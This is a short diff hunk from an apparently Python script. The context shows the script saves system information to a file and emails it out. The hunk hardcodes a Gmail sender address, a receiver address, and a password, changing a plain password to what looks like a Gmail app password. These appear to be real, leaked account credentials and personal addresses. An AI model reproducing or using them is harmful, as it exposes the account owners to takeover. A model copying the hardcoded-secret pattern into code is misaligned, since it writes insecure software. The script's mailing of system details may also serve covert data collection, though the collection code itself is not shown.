@@ -31,7 +31,7 @@ print("System information saved to system_info.txt")
 # Email configuration
 email_sender = 'eveangalinascampos@gmail.com'  # Replace with your Gmail address
 email_receiver = 'vshreene@gmail.com'  # Receiver's email address
-password = '23Sanchez!'  # Replace with your Gmail password
+password = 'mmbf jckw lnod kgqw'  # Replace with your Gmail password
 
 # Email content
 subject = 'System Information'
